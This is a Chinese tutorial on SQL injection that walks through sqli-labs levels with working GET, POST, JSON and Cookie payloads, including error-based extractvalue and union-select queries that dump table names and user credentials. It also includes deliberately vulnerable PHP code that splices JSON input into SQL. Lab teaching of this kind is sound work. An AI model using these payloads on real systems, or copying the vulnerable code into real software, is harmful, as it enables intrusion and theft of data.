[toc]

**前言**：在真实 SQL 注入安全测试中，我们一定要先明确提交数据及提交方法后再进行注入，其中提交数据类型和提交方法可以通过抓包分析获取， 后续安全测试中我们也必须满足同等的操作才能进行注入。

![](https://img.yatjay.top/md/202203251641093.png)

# 涉及知识

## 参数类型

数字、字符、搜索、json等

### 为何分参数类型——绕过SQL语句中的干扰符号

```sql
-- 已知源码中的SQL语句为
$name=$_GET['x']
select * from users where name='$name';

-- 网址上进行注入
?x=xiaodi and 1=1

-- 带入数据库中的SQL语句为
$name=$_GET['x']
select * from users where name='xiaodi and 1=1';
-- 注入语句显然无法正常执行
-- 所以，要检查是否有注入点的代码被带入在单引号之中，这样我们就无法进行是否能进行sql语句的判断

-- 我们应该在网站这样写使得单引号闭合
?x=xiaodi' and 1=1 --+

-- 对应的SQL语句为
select * from users where name='xiaodi' and 1=1 --+';
-- 这样我们就能进行对应的SQL注入的测试，即我们需要先把单引号进行过滤
```

**注：** 其中 SQL 语句干扰符号：’ , " ,% , ) , } 等，具体需看写法

#### 1. 数字类型

前面教程所演示的SQL注入参数类型都是数字型的，我们在注入的时候不需要进行符号闭合的操作

如果是数字的话可能不存在单引号

在数字上加单引号也是有可能的，要看对方的写法

#### 2. 字符类型

带有单引号,我们不能再采取数字型的注入方式，否则进行测试的语句也被带进语句中，无法起到注入的效果，我们应该把符号进行闭合

1.  一般是采用单引号，如果参数是字符的话那肯定是有单引号的
2. 即使有注入也会带入单引号里，产生不了任何作用，所以我们要做的前提是先要把它的符号闭合掉
3. 也有可能有括号，注入的时候需要去尝试

#### 3. 搜索(模糊查询)

将数据在数据库进行搜索并进行展示，搜索符号是%，在过滤的时候要过滤单引号和百分号，不然语句全部在单引号和百分号里

```sql
-- 已知源码中的SQL模糊查询语句
$name=$_GET['x']
select * from users where name like'%$name%';

-- 在网址上提交搜索关键字
?x=xiaodi 

-- 对应的SQL语句为
select * from users where name like'%xiaodi%';

-- 这里如果尝试注入，我们需要过滤掉单引号和百分号，才能够进行对应的SQL注入
```

#### 4. JSON

##### JSON基础

a. 简介

JSON 是存储和交换文本信息的语法，是轻量级的文本数据交换格式。类似xml，但JSON 比 XML 更小、更快，更易解析。所以现在接口数据传输都采用json方式进行。JSON 文本的 MIME 类型是 "application/json"。json仅仅是一种数据格式而已，基本上APP数据都是由JSON提交。

b. JSON语法

- 数据在名称/值对中
- 数据由逗号分隔
- 大括号保存对象
- 中括号保存数组

c. JSON值

- 数字（整数或浮点数） {"age":30 }
- 字符串（在双引号中） {"uname":"yang"}
- 逻辑值（true 或 false） {"flag":true }
- 数组（在中括号中）{"sites":[{"name":"yang"},{"name":"ming"}]}
- 对象（在大括号中）JSON 对象在大括号（{}）中书写：
- null  { "runoob":null }

d. JSON代码格式

```json
{
    "a":"1 and 1 = 1",  //此双引号是json格式自带，注入时不用考虑json中的双引号闭合
    "b":"2",
    "c":"3"
}

```

下面SQL语句`'{$username}'`含义是取json里面的username这个值，在SQL注入语句闭合时，只考虑闭合下面语句中的单引号
```sql
$sql="SELECT username,password FROM users WHERE username='{$username}'";
```
json的SQL注入语句示例如下
```sql
json={"username":"Dumb' and 1 = 2 union select 1,database(),3"}
```

##### JSON注入

JSON注入是指应用程序所解析的JSON数据来源于不可信赖的数据源，程序没有对这些不可信赖的数据进行验证、过滤，如果应用程序使用未经验证的输入构造 JSON，则可以更改 JSON 数据的语义。在相对理想的情况下，攻击者可能会插入无关的元素，导致应用程序在解析 JSON数据时抛出异常。

## 请求方法

GET、POST、COOKIE、REQUEST、HTTP头等

###  查看请求方法

根据网站的情况来获取相应的请求方法，请求方法可以通过在访问网站的时候审查元素里数据包的前缀看查看，找到Request Headers(请求头)

![](https://img.yatjay.top/md/202203251641196.png)

### GET和POST
#### 1. GET和POST区别

1. 一般大数据会采用POST方法提交，小数据会采用GET方法提交。

2. GET方法会将提交的数据显示在网址中，而POST不会。

不同的请求方式，它请求的数据类型或者大小都不同。在注入时候需要按照网站的请求方法去注入，否则数据可能无法提交成功。

#### 2. 代码演示

```php
<?php
echo 'For test GET and POST';
echo '<br/>';  

$get=$_GET['g'];  //GET方法接收参数名g的值，赋值给变量get
echo $get;  //输出变量get的数据
echo '<br/>';  

$post=$_POST['p'];  //POST方法接收参数名p的值赋值给变量post
echo $post;  //输出变量post的数据
echo '<br/>';  

?>
```

##### GET方法传值提交后抓包

GET方法提交方式是在URL后使用`?g=123`提交

![](https://img.yatjay.top/md/202203251641434.png)

![](https://img.yatjay.top/md/202203251641972.png)

可见**GET方法提交的数据在提交数据包的最前，并且显示在URL当中。**

##### POST方法传值提交后抓包

POST方法提交方式是在hackbar勾选`Post data`选项后在下面写`p=456`，不能像GET方法一样进行数据提交。

![](https://img.yatjay.top/md/202203251642293.png)

![](https://img.yatjay.top/md/202203251642432.png)

可见**POST方法提交的数据在数据包的最末尾处而且在URL中不显示出来。**



##### GET和POST方法同时传值提交

![](https://img.yatjay.top/md/202203251642007.png)

![](https://img.yatjay.top/md/202203251642327.png)

可见**当GET方法和POST方法同时提交数据时，数据包最前显示为POST方法，GET方法提交的数据在数据包最前文件名之后`?g=123`，而且不管最前面显示的是什么方法，只要写在文件名后面，就能够接收得到。POST方法提交的数据在数据包最末`p=456`。**

因此，若是POST方式提交数据进行SQL注入，就必须把注入语句写在数据包末尾处进行提交，如果对POST数据仍在URL处提交，那么后端接收不到注入语句。

### REQUEST

 GET、POST接收对应单一方式提交的 参数，REQUEST则不论什么方法提交参数都能接收。

网站在访问的时候由于我们大多数是黑盒测试，不知道对方代码写法，如果对方采用REQUEST接收方式，就不需要考虑用何种方法去提交，因为用GET、POST都可以。如果对方是单一接收方式，那么在注入的时候需要用它的方法去注入。

#### 测试是否为REQUEST方法

分别使用GET方法和POST方法对参数进行提交，如果返回的网页没有任何区别，则说明是使用REQUEST方法提交，用GET、POST都可以；

否则就是使用GET方法或POST方法，就用对应方法提交参数。

#### 代码演示

```php
<?php
echo 'For test REQUEST';
echo '<br/>';  

$request=$_REQUEST['r'];
echo $request;
echo '<br/>';  
?>
```

GET方式提交

![](https://img.yatjay.top/md/202203251642839.png)

POST方式提交

![](https://img.yatjay.top/md/202203251642086.png)

可见不论是使用何种方式提交参数，都能够被接受。

### COOKIE

Cookie写在HTTP请求头当中

#### Cookie 是什么

https://zhuanlan.zhihu.com/p/22396872

1. Cookie 是浏览器访问服务器后，服务器传给浏览器的一段数据。

2. 浏览器需要保存这段数据，不得轻易删除。

3. 此后每次浏览器访问该服务器，都必须带上这段数据。

#### 如何使用 Cookie

Cookie 一般有两个作用。

**第一个作用是识别用户身份。**

比如用户 A 用浏览器访问了 [http://a.com](http://a.com/)，那么 [http://a.com](http://a.com/) 的服务器就会立刻给 A 返回一段数据「uid=1」（这就是 Cookie）。当 A 再次访问 [http://a.com](http://a.com/) 的其他页面时，就会附带上「uid=1」这段数据。

同理，用户 B 用浏览器访问 [http://a.com](http://a.com/) 时，[http://a.com](http://a.com/) 发现 B 没有附带 uid 数据，就给 B 分配了一个新的 uid，为2，然后返回给 B 一段数据「uid=2」。B 之后访问 [http://a.com](http://a.com/) 的时候，就会一直带上「uid=2」这段数据。

借此，[http://a.com](http://a.com/) 的服务器就能区分 A 和 B 两个用户了。

**第二个作用是记录历史。**

假设 [http://a.com](http://a.com/) 是一个购物网站，当 A 在上面将商品 A1 、A2 加入购物车时，JS 可以改写 Cookie，改为「uid=1; cart=A1,A2」，表示购物车里有 A1 和 A2 两样商品了。

这样一来，当用户关闭网页，过三天再打开网页的时候，依然可以看到 A1、A2 躺在购物车里，因为浏览器并不会无缘无故地删除这个 Cookie。

借此，就达到里记录用户操作历史的目的了。

（上面的例子只是为了让大家了解 Cookie 的作用而构想出来的，实际的网站使用 Cookie 时会更谨慎一些。）

#### 代码演示


```php
<?php
echo 'For test COOKIE';
echo '<br/>';  

$cookie=$_COOKIE['c'];
echo $cookie;
?>
```

访问后抓包，在burp里修改请求头来提交cookie值，再放行

![](https://img.yatjay.top/md/202203251646483.png)

![](https://img.yatjay.top/md/202203251642323.png)



### SERVER

$_SERVER用于获取**当前访问者**的一些信息，如设备信息、系统信息

$_SERVER 是一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组。这个数组中的项目由 Web 服务器创建。不能保证每个服务器都提供全部项目；服务器可能会忽略一些，或者提供一些没有在这里列举出来的项目。

$\_SERVER是PHP里内置变量，全局变量，PHP写脚本时用它来获取系统的值，**如果目标主机把$\_SERVER中的值传入数据库中拼接SQL语句，就会存在SQL注入。**

SQL注入漏洞的原理即是接收数据并且把该数据带入数据库中进行查询，若目标主机会把访问者信息中的字段带入数据库进行执行，此时数据接收发生在数据包中，只需在数据包中写注入语句，即是**HTTP头部注入**。

#### 演示

站长之家显示的本机IP及系统信息

<img src="https://img.yatjay.top/md/202203251642877.png" style="zoom:50%;" />

抓包修改$_SERVER信息

<img src="https://img.yatjay.top/md/202203251642719.png" style="zoom:50%;" /><img src="https://img.yatjay.top/md/202203251642593.png" style="zoom:50%;" />

<img src="https://img.yatjay.top/md/202203251642482.png" style="zoom:50%;" />







# 演示案例

## 参数字符型注入测试——→sqlilabs Less-5、Less-6

### Less-5

正常提交参数显示`You are in...........`

![](https://img.yatjay.top/md/202203251642329.png)

输入?id=1 and 1=2 无反应   考虑到可能是整句话都被闭合掉了

传参时可能是  id = ' $id ' 

输入的 id=1 and 1=3 整个都包含在两个单引号中，全被当成了传入的参数。 and 1=3起不到检测报错的作用

![](https://img.yatjay.top/md/202203251643457.png)

加上单引号 SQL语法错误提示

![](https://img.yatjay.top/md/202203251643305.png)

由报错信息可知该SQL语句出错在`...id='1" limit 0,1`

![](https://img.yatjay.top/md/202203251643581.png)

由报错信息可知该SQL语句出错在`...id='1' and 1=1' limit 0,1`

根据以上报错信息推测原SQL语句对于传递的id参数使用**单引号**闭合

接下来针对单引号闭合构造对应注入语句，使得SQL语句中的单引号闭合即可即有意使前后单引号都和传递的参数中的引号闭合

```sql
?id=1' and '1'='1  
```

可以看到SQL语句成功执行

![](https://img.yatjay.top/md/202203251643210.png)

构造报错语句检测注入点存在：可见语句成功执行了，确实存在注入点

![](https://img.yatjay.top/md/202203251643833.png)

爆字段数，注意使用`order by`时无法闭合原SQL语句中的后单引号，因此需要将后单引号以及后面全注释掉

由此可知查询结果包含3个字段即3列

![](https://img.yatjay.top/md/202203251643756.png)

![](https://img.yatjay.top/md/202203251643195.png)

爆输出位置，注意本题没有回显，即使联合查询`union select 1,2,3`，也不会回显输出

![](https://img.yatjay.top/md/202203251643267.png)

因此使用**报错注入**，即页面上没有显示位，但是需要输出 SQL 语句执行错误信息。比如 mysql_error()。这会在后续学习。

此处我们使用`and (extractvalue(1,concat(0x7e,(select user()),0x7e)));`进行报错注入

爆库名 

```sql
?id=-1' and (extractvalue(1,concat(0x7e,(select database()),0x7e)));--+
```

得到数据库名为security

![](https://img.yatjay.top/md/202203251643700.png)

爆用户名 `?id=-1' and (extractvalue(1,concat(0x7e,(select user()),0x7e)));--+`

![](https://img.yatjay.top/md/202203251643374.png)

爆表名 

```sql
?id=-1' and (extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e)))--+ 
```

 并且使用limit对多条结果进行依次输出

得到数据库security数据库中的数据表名分别是emails、referers、uagents、users 

![](https://img.yatjay.top/md/202203251643689.png)

![](https://img.yatjay.top/md/202203251643062.png)

爆列名

针对security数据库的user数据表，爆表名

```sql
?id=-1' and (extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users' and table_schema=database() limit 0,1),0x7e)))--+
```

**注意指定的表名users一定要加上单引号作为字符串，不能直接写**，并且使用limit对多条结果进行依次输出

得到数据库security数据库中的users表中的列名分别是id、username、password

![](https://img.yatjay.top/md/202203251643509.png)

查询指定数据，并且使用limit对多条结果进行依次输出

```sql
?id=-1' and (extractvalue(1,concat(0x7e,(select username from  users order by id limit 0,1),0x7e)))--+
```
![](https://img.yatjay.top/md/202203251643332.png)

```sql
?id=-1' and (extractvalue(1,concat(0x7e,(select password from  users order by id limit 0,1),0x7e)))--+
```
![](https://img.yatjay.top/md/202203251643550.png)

### Less-6

正常提交数据，界面显示 You are in...........

![](https://img.yatjay.top/md/202203251643762.png)

尝试添加单引号进行闭合发现没有作用

![](https://img.yatjay.top/md/202203251644906.png)

然后尝试双引号，出现语法报错

![](https://img.yatjay.top/md/202203251644492.png)

由报错信息可知该SQL语句出错在`...id="1"" limit 0,1`

![](https://img.yatjay.top/md/202203251644243.png)

由报错信息可知该SQL语句出错在`...id="1"" limit 0,1`

猜测源代码传参格式是` id = " $id " LIMIT 0,1`，即是使用双引号闭合

提交`?id=1" and "1"="1`可以成功闭合并成功执行

![](https://img.yatjay.top/md/202203251644575.png)

测试是否存在注入点：可见存在注入点

![](https://img.yatjay.top/md/202203251644479.png)

已经有不同回显，说明此页面存在SQL注入，其余步骤和第五关是一样。

## POST数据提交注入测试——→sqlilabs Less-11

网址上没有任何参数，它的数据不在上面进行提交，后台在进行用户登陆的时候会接收你输入的数据，在从数据库中的数据进行对比在进行反馈。提交的用户名和密码值，必然带入SQL语句执行，和数据库产生交互。

猜测SQL语句大致类似`select - - from user where uname='admin' and passwd='admin'`

存在**可控变量，代入数据库查询，变量未过滤或过滤不严谨**，这满足了SQL注入的产生条件。

考虑到用户名和密码不可能是纯数字，所以会有单引号等对字符闭合。

用抓包工具，比如Burpsuite,在数据包里进行注入。

查看源代码，找到需要传递的参数：uname  passwd  submit     

![](https://img.yatjay.top/md/202203251644959.png)

使用hackbar或者burp的POST提交功能进行SQL注入测试

![](https://img.yatjay.top/md/202203251644934.png)

输入admin admin 可以成功登陆说明admin admin带入SQL语句成功执行

对上述过程进行抓包——发送到repeater模块进行提交测试

![img](https://img.yatjay.top/md/202203251644265.png)

在repeater中通过修改post的参数进行注入，注意引号的闭合。

`uname=admin' and 1=1 --+ &passwd=admin&submit=Submit` 可以登录

![](https://img.yatjay.top/md/202203251644030.png)

`uname=admin' and 1=2--+ &passwd=admin&submit=Submit` 无法登录

![](https://img.yatjay.top/md/202203251644204.png)

这说明注入生效，存在SQL注入，并且存在回显。

使用`order by`判定输出结果列数为2列

![](https://img.yatjay.top/md/202203251644183.png)

![](https://img.yatjay.top/md/202203251644773.png)

使用`select 1,2`判定输出位置

![](https://img.yatjay.top/md/202203251644758.png)

**爆数据库名和用户名**：

```sql
uname=-9' union select database(),user()--+&passwd=admin&submit=Submit
```

![](https://img.yatjay.top/md/202203251644398.png)

**爆当前数据库表名**：emails referers uagents users

```sql
uname=-9' union select group_concat(table_name),2 from information_schema.tables where table_schema=database()--+&passwd=admin&submit=Submit
```

![](https://img.yatjay.top/md/202203251644909.png)

**爆字段名：**id username password

```sql
uname=-9' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' --+&passwd=admin&submit=Submit
```

![](https://img.yatjay.top/md/202203251645700.png)

**爆字段值：**

Dumb>Dumb,

Angelina>I-kill-you,

Dummy>p@ssword,

secure>crappy,

stupid>stupidity,

superman>genious,

batman>mob!le,

admin>admin,

admin1>admin1,

admin2>admin2,

admin3>admin3,

dhakkan>dumbo,

admin4>admin4,

admin5>admin5

```sql
uname=-9' union select group_concat(username,'>',password),2 from users--+&passwd=admin&submit=Submit
```

![](https://img.yatjay.top/md/202203251645904.png)

**注意：**

**如果是使用hackbar直接提交时，--+有时会报错，需要使用#注释，使用burp可以是--+，因为POST提交的数据，所以不用进行url编码，直接显示的是POST原文**

**总结：**

（GET提交方式）：

　  　   -- （后面有空格）（--+）

　　     %23

　    　payload结尾单引号闭合

（POST提交方式）：

　  　   -- （后面有空格）（--+）

　  　   #

　　     payload结尾单引号闭合

## 参数JSON数据注入测试——→在线实例、本地环境代码演示

### 在线实例

通过抓包来进行判断是什么提交格式

测试地址：https://tianchi.aliyun.com/competition/entrance/531796/rankingList

访问之后——[首页](https://tianchi.aliyun.com/home)>[天池大赛](https://tianchi.aliyun.com/competition)>随便选择一个比赛>开启抓包后点击赛题与数据

可以看到提交的数据格式是json

![](https://img.yatjay.top/md/202203251645523.png)

```json
{
    "gmkey":"CLK",
    "gokey":"name%3D5176.12281978.AliyunTracker%26_g_encode%3Dutf-8%26qs%3Dacm_params%3Alink%25253D%25252523%3Buuid%3ABOQJJo7FE%3Bacm_xpath%3A%25252F%25252F*%255B%2540id%25253D%252522main%252522%255D%25252Fdiv%255B1%255D%25252Fdiv%255B1%255D%25252Fdiv%255B1%255D%25252Fdiv%255B1%255D%25252Fdiv%255B1%255D%25252Fdiv%255B1%255D%25252Fdiv%255B1%255D%25252Fdiv%255B1%255D%25252Fdiv%255B3%255D%25252Fdiv%255B1%255D%25252Ful%255B1%255D%25252Fli%255B2%255D%25252Fa%255B1%255D%3Bacm_container%3Aspm%25253A12281978%253Espm%25253A1000%3Bvisit_time%3A20220208090720%3Bpm_spm%3A5176.12281976%3Bpm_terminal%3APC%3Bpm_url%3Ahttps%25253A%25252F%25252Ftianchi.aliyun.com%25252Fcompetition%25252Fentrance%25252F531944%25252Finformation%3Bacm_type%3Aclick%3Bacm_content%3A%25E8%25B5%259B%25E9%25A2%2598%25E4%25B8%258E%25E6%2595%25B0%25E6%258D%25AE%3Bacm_module_id%3A1000%3Bpm_channel%3A%26jsver%3Daplus_std%26lver%3D8.15.19%26pver%3D0.7.11%26cache%3D35ea571%26page_cna%3D%26_slog%3D0",
    "cna":"",
    "_p_url":"https%3A%2F%2Ftianchi.aliyun.com%2Fcompetition%2Fentrance%2F531944%2Finformation",
    "spm-cnt":"5176.12281978.0.0.4bf61314bpWtTP",
    "logtype":"2"
}
```

### 本地环境代码演示

JOSN-php本地代码如下

```php
<?php
  // php防止中文乱码
  header('content-type:text/html;charset=utf-8');
  
  if(isset($_POST['json'])){
    $json_str=$_POST['json'];
    $json=json_decode($json_str);
    if(!$json){
      die('JSON文档格式有误，请检查');
    }
    $username=$json->username;
    //$password=$json->password;
 
    // 建立mysql连接，root/root连接本地数据库
    $mysqli=new mysqli();
    $mysqli->connect('localhost','root','root');
    if($mysqli->connect_errno){
      die('数据库连接失败：'.$mysqli->connect_error);
    }
	
    // 要操作的数据库名，我的数据库是security
    $mysqli->select_db('security');
    if($mysqli->errno){
      dir('打开数据库失败：'.$mysqli->error);
    }
	
    // 数据库编码格式
    $mysqli->set_charset('utf-8');
	
    // 从users表中查询username，password字段
      //下面SQL语句'{$username}'含义是取json里面的username这个值，在SQL注入语句闭合时，只考虑闭合下面语句中的单引号
    $sql="SELECT username,password FROM users WHERE username='{$username}'";
    $result=$mysqli->query($sql);
    if(!$result){
      die('执行SQL语句失败：'.$mysqli->error);
    }else if($result->num_rows==0){
      die('查询结果为空');
    }else {
      $array1=$result->fetch_all(MYSQLI_ASSOC);
      echo "用户名：{$array1[0]['username']},密码：{$array1[0]['password']}";
    }
	
    // 释放资源
    $result->free();
    $mysqli->close();
  }
?>
```

访问上述代码地址

![](https://img.yatjay.top/md/202203251645218.png)

以json格式正常提价数据

![](https://img.yatjay.top/md/202203251645763.png)

加入注入语句进行测试

![](https://img.yatjay.top/md/202203251645291.png)

尝试爆用户名和数据库名

![](https://img.yatjay.top/md/202203251645830.png)

**json只是数据格式不同，把各个数据写成类似列表或键值对的形式，注入时提交语句是相通的，不要害怕。**

## COOKIE数据提交注入测试——→sqlilabs Less-20

从源代码中我们可以看到 cookie 从 username 中获得值后， 当再次刷新时， 会从 cookie 中读取 username， 然后进行查询。

登录成功后， 我们修改 cookie， 再次刷新时， 这时候 sql 语句就会被修改了



使用admin-admin登录成功(**必须有首次成功登陆后才会生成cookie，后续才能修改cookie值，否则cookie值为空**)

![](https://img.yatjay.top/md/202203251645535.png)

尝试抓包修改后提交

![](https://img.yatjay.top/md/202203251645109.png)

![](https://img.yatjay.top/md/202203251645731.png)

查看源码可以看到该php文件对于POST方法提交的数据会进行过滤

![](https://img.yatjay.top/md/202203251645571.png)

因此POST方法提交数据进行注入是走不通的。

但是源码中对于登录后生成的cookie中得数据是不做过滤的

![](https://img.yatjay.top/md/202203251645821.png)

因此我们可以通过修改cookie中的值，进行注入语句的提交

登陆成功之后刷新页面，我们发现此时网页**通过 cookie 记录用户登录状态，所以无需再次登录**。注意到所抓到的包的 cookie 中存储了用户名，由此猜测 uname 字段是个注入点。

登录后刷新页面抓包，在数据包中修改cookie中uname的值，加入注入语句后提交数据包

测试是否存在注入点

为真条件提交，返回无变化

![](https://img.yatjay.top/md/202203251645778.png)

为假条件提交，返回发生变化

![](https://img.yatjay.top/md/202203251645913.png)

这说明存在SQL注入漏洞

`admin’ order by--+`得到查询结果字段数为3

![](https://img.yatjay.top/md/202203251646093.png)

![](https://img.yatjay.top/md/202203251646051.png)

`admin’ and 1=2 union select 1,2,3--+`确定输出位置

![](https://img.yatjay.top/md/202203251646037.png)

`database(),user(),version()`确定数据库名、用户名等信息：数据库名security，用户名root，数据库版本5.5.53

![](https://img.yatjay.top/md/202203251646705.png)

之后按照流程进行先后爆出表名、列名、指定数据即可。

## ==HTTP头部参数数据注入测试——→sqlilabs Less-18==

 首先输入正确的账号和密码，观察到网页回显了 IP Address 和 User Agent。用户代理 User Agent 是一个 HTTP 头，使得服务器能够识别客户使用的操作系统及版本、CPU 类型、浏览器及版本、浏览器渲染引擎、浏览器语言、浏览器插件等

![](https://img.yatjay.top/md/202203251646132.png)

==////////////////////////////////////////涉及insert语句注入——后续//////////////////////////////////////////==

# 涉及资源

## 配合sqlilabs本地数据库演示

```php
<?php
  // php防止中文乱码
  header('content-type:text/html;charset=utf-8');
  
  if(isset($_POST['json'])){
    $json_str=$_POST['json'];
    $json=json_decode($json_str);
    if(!$json){
      die('JSON文档格式有误，请检查');
    }
    $username=$json->username;
    //$password=$json->password;
 
    // 建立mysql连接，root/root连接本地数据库
    $mysqli=new mysqli();
    $mysqli->connect('localhost','root','root');
    if($mysqli->connect_errno){
      die('数据库连接失败：'.$mysqli->connect_error);
    }
	
    // 要操作的数据库名，我的数据库是security
    $mysqli->select_db('security');
    if($mysqli->errno){
      dir('打开数据库失败：'.$mysqli->error);
    }
	
    // 数据库编码格式
    $mysqli->set_charset('utf-8');
	
    // 从users表中查询username，password字段
    $sql="SELECT username,password FROM users WHERE username='{$username}'";
    $result=$mysqli->query($sql);
    if(!$result){
      die('执行SQL语句失败：'.$mysqli->error);
    }else if($result->num_rows==0){
      die('查询结果为空');
    }else {
      $array1=$result->fetch_all(MYSQLI_ASSOC);
      echo "用户名：{$array1[0]['username']},密码：{$array1[0]['password']}";
    }
	
    // 释放资源
    $result->free();
    $mysqli->close();
  }
?>
```

